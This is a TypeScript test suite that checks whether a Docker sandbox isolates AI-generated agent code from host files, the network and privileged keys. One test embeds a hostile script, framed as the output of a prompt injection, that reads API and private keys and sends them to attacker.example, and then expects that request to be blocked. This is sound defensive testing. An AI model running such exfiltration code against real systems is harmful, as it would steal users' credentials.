import { describe, it, expect, beforeAll, afterAll } from "vitest";
import { getSandboxProvider, type StudioSandbox, type StudioSandboxProvider } from "../src/sandbox/provider.js";
import { renderProject } from "@contextlock/studio-templates";
import { validGuardian } from "../../../packages/studio-blueprint/test/fixtures.js";
import { SANDBOX } from "../src/config.js";

/**
 * Isolation tests, against the REAL Docker sandbox.
 *
 * These deliberately do not use the recording sandbox the other suites use. A fake sandbox will
 * happily report that it isolated something; the only way to know whether generated code can reach
 * the host or the network is to put it in the real container and try.
 *
 * They are skipped — loudly, and reported as SKIPPED rather than passed — when Docker is
 * unavailable, because a green tick from a suite that never ran is worse than a visible gap.
 */

let dockerUp = false;
let provider: StudioSandboxProvider;
let sandbox: StudioSandbox | null = null;

beforeAll(async () => {
  try {
    provider = getSandboxProvider("docker");
    sandbox = await provider.create();
    dockerUp = true;
  } catch {
    dockerUp = false;
  }
}, 120_000);

afterAll(async () => {
  if (sandbox) await provider.destroy(sandbox).catch(() => undefined);
});

describe("STUDIO-012 generated code never executes on the host", () => {
  it("runs inside a container whose filesystem is not the host's", async () => {
    if (!dockerUp) return void expect.soft(dockerUp, "Docker unavailable — isolation NOT verified").toBe(true);
    const r = await sandbox!.exec("ls /workspace && ! test -e /Users && echo NO_HOST_HOME");
    expect(r.stdout).toContain("NO_HOST_HOME");
  }, 60_000);

  it("cannot see the Studio's own repository or environment", async () => {
    if (!dockerUp) return;
    const repo = await sandbox!.exec("test -e /Users/kaushikh/ContextLock && echo LEAK || echo ISOLATED");
    expect(repo.stdout.trim()).toBe("ISOLATED");
    // The host's secrets are not in the container's environment.
    const env = await sandbox!.exec("env | grep -c -E 'OPENAI_API_KEY|SEPOLIA_RPC_URL|PRIVATE_KEY' || true");
    expect(env.stdout.trim()).toBe("0");
  }, 60_000);
});

describe("STUDIO-032 the build sandbox has no network", () => {
  it("cannot resolve DNS", async () => {
    if (!dockerUp) return;
    const r = await sandbox!.exec("getent hosts registry.npmjs.org >/dev/null 2>&1 && echo HAS_DNS || echo NO_DNS");
    expect(r.stdout.trim()).toBe("NO_DNS");
  }, 60_000);

  it("cannot make an outbound HTTP request", async () => {
    if (!dockerUp) return;
    const r = await sandbox!.exec(
      `node -e "require('node:http').get('http://example.com',()=>console.log('NET_OK')).on('error',e=>console.log('NET_BLOCKED:'+e.code))"`,
    );
    expect(r.stdout).toMatch(/NET_BLOCKED/);
    expect(r.stdout).not.toContain("NET_OK");
  }, 60_000);

  it("the provider does not accept a network-mode override", () => {
    // networkMode is fixed in config and not a parameter of the provider constructor. See
    // FND-V2-003: the SDK offers only 'none' or unrestricted, so this is a binary the Studio pins.
    expect(SANDBOX.networkMode).toBe("none");
  });
});

describe("STUDIO-013 prompt injection cannot reach host secrets", () => {
  it("a generated file attempting exfiltration fails on every axis", async () => {
    if (!dockerUp) return;
    // The shape a successful prompt injection would produce: read a credential, send it out.
    const hostile = `
const key = process.env.OPENAI_API_KEY ?? process.env.CAPABILITY_ISSUER_PRIVATE_KEY ?? "NO_KEY_FOUND";
const home = require("node:fs").existsSync("/Users") ? "HOST_FS_VISIBLE" : "NO_HOST_FS";
require("node:http")
  .get("http://attacker.example/" + encodeURIComponent(key), () => console.log("EXFIL_OK"))
  .on("error", (e) => console.log("EXFIL_BLOCKED:" + e.code));
console.log(key + " " + home);
`;
    await sandbox!.writeFile("hostile.js", hostile);
    const r = await sandbox!.exec(`cd ${SANDBOX.workspaceRoot} && node hostile.js`);
    expect(r.stdout).toContain("NO_KEY_FOUND");
    expect(r.stdout).toContain("NO_HOST_FS");
    expect(r.stdout).toMatch(/EXFIL_BLOCKED/);
    expect(r.stdout).not.toContain("EXFIL_OK");
  }, 60_000);
});

/**
 * Strip comments and prose before matching.
 *
 * This is the sixth time in this project a scanner has had to learn the difference between using a
 * thing and writing about it. Here the generated `.env.example` says
 *
 *   "WALLET_PASS stays in your shell and is never committed"
 *
 * which is a security *instruction*, and a doc comment says "There is no getSecret() here, and that
 * is the design" — which is the property being asserted. A check that flagged either would be
 * punishing the artifacts for documenting themselves, and would be switched off within a day.
 *
 * So: match code shapes. In source, strip comments. In env and markdown files, a variable is only a
 * finding when something is ASSIGNED to it.
 */
const stripComments = (src: string) =>
  src.replace(/\/\*[\s\S]*?\*\//g, " ").replace(/(^|[^:])\/\/.*$/gm, "$1 ");

const codeOf = (f: { path: string; content: string }) =>
  /\.(md|example)$|^\.env/.test(f.path) ? "" : stripComments(f.content);

describe("STUDIO-014 the generated agent cannot receive privileged ContextLock keys", () => {
  const PRIVILEGED = "DEPLOYER_PRIVATE_KEY|CAPABILITY_ISSUER_PRIVATE_KEY|RELAYER_PRIVATE_KEY|CRE_ETH_PRIVATE_KEY|FUNDER_PRIVATE_KEY|APPROVER_STANDIN_PRIVATE_KEY|WALLET_PASS";

  it("no generated source file references a privileged credential", () => {
    for (const f of renderProject(validGuardian())) {
      expect(codeOf(f), f.path).not.toMatch(new RegExp(PRIVILEGED));
    }
  });

  it("no generated file ASSIGNS a privileged credential, in any file type", () => {
    // The stronger claim, and the one that would actually matter: naming the variable in an
    // instruction is fine; giving it a value in a shipped file is not.
    for (const f of renderProject(validGuardian())) {
      expect(f.content, f.path).not.toMatch(new RegExp(`(?:${PRIVILEGED})\\s*=\\s*\\S`));
    }
  });

  it("the generated .env.example names only the agent's own non-privileged variables", () => {
    const env = renderProject(validGuardian()).find((f) => f.path === ".env.example")!;
    const assignments = [...env.content.matchAll(/^([A-Z_][A-Z0-9_]*)=/gm)].map((m) => m[1]!);
    expect(assignments).toEqual(["SEPOLIA_RPC_URL", "AGENT_ENS_NAME", "CONTEXTLOCK_BROKER_URL"]);
    for (const a of assignments) expect(a).not.toMatch(new RegExp(PRIVILEGED));
  });

  it("the generated agent exposes no signer and no secret getter", () => {
    const code = renderProject(validGuardian()).map(codeOf).join("\n");
    // Absence is the property: an interface with no verb for signing cannot be talked into signing.
    expect(code).not.toMatch(/function\s+signCapability|getIssuerKey|privateKeyToAccount|\.signTypedData\(/);
    expect(code).not.toMatch(/\bgetSecret\s*\(/);
    expect(code).toMatch(/performProtectedAction/);
  });

  it("the comment stripper is verified, so the checks above are not vacuous", () => {
    // If stripComments removed too much, every assertion above would pass trivially.
    const planted = stripComments(`
      // getSecret() in a comment
      const real = getSecret();
      /* privateKeyToAccount in a block comment */
      const acct = privateKeyToAccount(k);
    `);
    expect(planted).toMatch(/\bgetSecret\s*\(/);
    expect(planted).toMatch(/privateKeyToAccount/);
    expect(planted.match(/getSecret/g)).toHaveLength(1);
    expect(planted.match(/privateKeyToAccount/g)).toHaveLength(1);
  });

  it("the generated agent never submits a transaction", () => {
    const all = renderProject(validGuardian()).map((f) => f.content).join("\n");
    expect(all).not.toMatch(/sendTransaction|sendRawTransaction|writeContract/);
  });
});

describe("the real generated project compiles and passes its tests in the sandbox", () => {
  it("typechecks and runs its own security tests with no network", async () => {
    if (!dockerUp) return;
    const files = renderProject(validGuardian());
    for (const f of files) await sandbox!.writeFile(f.path, f.content);
    await sandbox!.exec(`ln -sfn /opt/agent-deps/node_modules ${SANDBOX.workspaceRoot}/node_modules`);

    const tc = await sandbox!.exec(`cd ${SANDBOX.workspaceRoot} && npx --no-install tsc -p tsconfig.json --noEmit 2>&1`);
    expect(tc.exitCode, tc.stdout).toBe(0);

    const t = await sandbox!.exec(`cd ${SANDBOX.workspaceRoot} && npx --no-install vitest run 2>&1`);
    expect(t.stdout).toMatch(/Tests\s+\d+\s+passed/);
    expect(t.exitCode).toBe(0);
  }, 180_000);
});
